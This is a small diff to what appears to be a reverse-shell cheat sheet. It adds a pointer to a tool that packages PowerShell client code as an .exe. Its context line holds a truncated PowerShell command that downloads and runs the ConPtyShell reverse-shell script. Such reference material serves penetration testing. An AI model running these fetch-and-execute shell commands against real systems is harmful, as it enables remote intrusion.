@@ -574,6 +574,9 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 
 Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
 
+Make Executable File:<br>
+Convert Client Side code into exectable file(.exe) by using --> https://github.com/MScholtes/Win-PS2EXE
+
 ## References
 
 * [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
